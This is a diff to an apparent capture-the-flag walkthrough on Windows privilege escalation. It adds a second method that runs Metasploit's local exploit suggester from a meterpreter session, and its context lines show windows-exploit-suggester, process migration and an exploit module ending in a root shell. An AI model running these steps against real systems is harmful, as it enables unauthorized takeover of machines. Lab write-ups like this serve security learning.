@@ -49,6 +49,8 @@ run
 
 meterpreter shell spawned here. Now to escelate privelage just like grandpa
 
+### Method 1
+
 Getting system info:
 
 ```
@@ -94,6 +96,18 @@ copying the info to `systeminfo.txt` and running
 windows-exploit-suggester.py -d 2020-04-10-mssb.xls -i systeminfo.txt
 ```
 
+### Method 2
+Another way of searching for exploits in a meterpreter session is by using the suggester of metasploit
+
+```sh
+background # background the meterpreter session
+search suggester
+use multi/recon/local_exploit_suggester
+set session <SESSION ID>
+run
+```
+
+# Priv esc
 Next, migrating to this process for a more stable meterpreter session:
 
 ```sh
@@ -110,4 +124,5 @@ set SESSION <meterpreter session id>
 exploit
 ```
 
-and we have our root shell
+and we have our root shell.
+
